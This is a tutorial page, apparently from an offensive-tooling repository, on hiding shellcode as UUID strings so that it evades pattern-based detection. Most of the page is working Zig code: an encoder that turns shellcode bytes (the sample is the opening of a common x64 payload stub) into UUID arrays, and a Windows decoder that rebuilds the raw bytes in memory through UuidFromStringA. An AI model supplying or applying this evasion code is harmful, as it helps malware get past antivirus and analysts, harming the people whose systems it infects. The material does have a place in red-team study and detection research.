# UUID Obfuscation

## TL;DR

[See the code example](https://github.com/CX330Blake/Black-Hat-Zig/tree/main/src/Payload-Obfuscation/UUID-Obfuscation)

## Explanation

UUID obfuscation stores shellcode chunks as Universally Unique Identifier
strings. Since UUIDs are routinely seen in configuration files and logs, a list
of them does not appear suspicious. The program converts groups of 16 bytes into
UUID format and later decodes them back to raw bytes in memory. This method adds
an extra step for analysts trying to recover the original payload and can evade
simple pattern-based searches.

## Obfuscation

```zig title="main.zig"
const std = @import("std");

/// Generates a UUID string from 16 raw bytes
fn generateUuid(a: u8, b: u8, c: u8, d: u8, e: u8, f: u8, g: u8, h: u8, i: u8, j: u8, k: u8, l: u8, m: u8, n: u8, o: u8, p: u8, buffer: []u8) ![]const u8 {
    // In Zig, we can directly format the entire UUID in one go instead of
    // creating intermediate segments as in the C version
    return try std.fmt.bufPrint(buffer, "{X:0>2}{X:0>2}{X:0>2}{X:0>2}-{X:0>2}{X:0>2}-{X:0>2}{X:0>2}-{X:0>2}{X:0>2}-{X:0>2}{X:0>2}{X:0>2}{X:0>2}{X:0>2}{X:0>2}", .{ d, c, b, a, f, e, h, g, i, j, k, l, m, n, o, p });
}

/// Generate the UUID output representation of the shellcode
fn generateUuidOutput(pShellcode: []const u8, writer: anytype) !bool {
    const shellcodeSize = pShellcode.len;

    // If the shellcode buffer is empty or the size is not a multiple of 16, exit
    if (shellcodeSize == 0 or shellcodeSize % 16 != 0) {
        return false;
    }

    try writer.print("const uuid_array = [_][*:0]const u8{{\n\t", .{});

    // Buffer to hold the UUID string (36 chars + null terminator)
    var uuidBuffer: [40]u8 = undefined;

    // Process the shellcode in groups of 16 bytes
    var counter: usize = 0;
    var i: usize = 0;

    while (i < shellcodeSize) {
        // Make sure we have 16 bytes available
        if (i + 15 >= shellcodeSize) break;

        counter += 1;

        // Generate the UUID from the current 16 bytes
        const uuid = try generateUuid(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3], pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7], pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11], pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15], &uuidBuffer);

        // Print the UUID
        if (i == shellcodeSize - 16) {
            // Last UUID
            try writer.print("\"{s}\"", .{uuid});
        } else {
            // Not the last one, add comma
            try writer.print("\"{s}\", ", .{uuid});
        }

        // Move to next group of 16 bytes
        i += 16;

        // Add a newline for formatting after every 3 UUIDs
        if (counter % 3 == 0 and i < shellcodeSize) {
            try writer.print("\n\t", .{});
        }
    }

    try writer.print("\n}};\n\n", .{});
    return true;
}

pub fn main() !void {
    // Example shellcode (must be a multiple of 16 bytes)
    const shellcode = [_]u8{
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, // Add more shellcode here if needed
    };

    // Use stdout as the writer
    const stdout = std.io.getStdOut().writer();

    std.debug.print("[+] Generating UUID representation for {} bytes of shellcode\n", .{shellcode.len});

    // Generate and print the UUID representation
    if (try generateUuidOutput(&shellcode, stdout)) {} else {
        std.debug.print("[!] Failed to generate UUID representation\n", .{});
    }
}
```

## Deobfuscation

```zig title="main.zig"
const std = @import("std");
const windows = std.os.windows;
const WINAPI = windows.WINAPI;

// Type definitions
const RPC_STATUS = u32;
const RPC_CSTR = [*:0]const u8;
const UUID = extern struct {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [8]u8,
};

const RPC_S_OK: RPC_STATUS = 0;

// Function pointer type for UuidFromStringA
const UuidFromStringAFn = *const fn (RPC_CSTR, *UUID) callconv(WINAPI) RPC_STATUS;

// External function declarations
extern "kernel32" fn GetProcAddress(hModule: windows.HMODULE, lpProcName: [*:0]const u8) callconv(WINAPI) ?windows.FARPROC;
extern "kernel32" fn LoadLibraryA(lpLibFileName: [*:0]const u8) callconv(WINAPI) ?windows.HMODULE;
extern "kernel32" fn GetProcessHeap() callconv(WINAPI) windows.HANDLE;
extern "kernel32" fn HeapAlloc(hHeap: windows.HANDLE, dwFlags: windows.DWORD, dwBytes: usize) callconv(WINAPI) ?*anyopaque;
extern "kernel32" fn HeapFree(hHeap: windows.HANDLE, dwFlags: windows.DWORD, lpMem: ?*anyopaque) callconv(WINAPI) windows.BOOL;
extern "kernel32" fn GetLastError() callconv(WINAPI) windows.DWORD;

const HEAP_ZERO_MEMORY: windows.DWORD = 0x00000008;

pub fn uuidDeobfuscation(
    uuid_array: []const [*:0]const u8,
    pp_d_address: *?[*]u8,
    p_d_size: *usize,
) bool {
    // Getting UuidFromStringA address from Rpcrt4.dll
    const rpcrt4_handle = LoadLibraryA("RPCRT4") orelse {
        std.debug.print("[!] LoadLibrary Failed With Error : {}\n", .{GetLastError()});
        return false;
    };

    const proc_addr = GetProcAddress(rpcrt4_handle, "UuidFromStringA") orelse {
        std.debug.print("[!] GetProcAddress Failed With Error : {}\n", .{GetLastError()});
        return false;
    };

    const uuid_from_string_a: UuidFromStringAFn = @ptrCast(proc_addr);

    // Getting the real size of the shellcode which is the number of UUID strings * 16
    const buff_size = uuid_array.len * 16;

    // Allocating memory which will hold the deobfuscated shellcode
    const buffer_ptr = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buff_size) orelse {
        std.debug.print("[!] HeapAlloc Failed With Error : {}\n", .{GetLastError()});
        return false;
    };

    const buffer: [*]u8 = @ptrCast(buffer_ptr);
    var tmp_buffer: [*]u8 = buffer;

    // Loop through all the UUID strings saved in uuid_array
    for (uuid_array, 0..) |uuid_string, i| {
        // Deobfuscating one UUID string at a time
        _ = i; // Suppress unused variable warning
        const status = uuid_from_string_a(uuid_string, @ptrCast(@alignCast(tmp_buffer)));

        if (status != RPC_S_OK) {
            std.debug.print("[!] UuidFromStringA Failed At [{s}] With Error 0x{X:0>8}\n", .{ uuid_string, status });
            return false;
        }

        // 16 bytes are written to tmp_buffer at a time
        // Therefore tmp_buffer will be incremented by 16 to store the upcoming 16 bytes
        tmp_buffer += 16;
    }

    pp_d_address.* = buffer;
    p_d_size.* = buff_size;

    return true;
}

// Example usage
pub fn main() !void {
    // Example UUID array (you would replace this with actual UUIDs)
    const uuid_array = [_][*:0]const u8{"E48348FC-E8F0-00C0-0000-415141505251"};
    var deobfuscated_data: ?[*]u8 = null;
    var data_size: usize = 0;

    if (uuidDeobfuscation(uuid_array[0..], &deobfuscated_data, &data_size)) {
        std.debug.print("[+] Deobfuscation successful! Size: {} bytes\n", .{data_size});

        // Use the deobfuscated data here
        if (deobfuscated_data) |data| {
            // Example: print first few bytes
            for (0..@min(data_size, 32)) |i| {
                std.debug.print("{X:0>2} ", .{data[i]});
            }
            std.debug.print("\n", .{}); // Fixed: empty tuple instead of empty braces

            // Free allocated memory
            _ = HeapFree(GetProcessHeap(), 0, data);
        }
    } else {
        std.debug.print("[!] Deobfuscation failed!\n", .{}); // Fixed: empty tuple instead of empty braces
    }
}
```
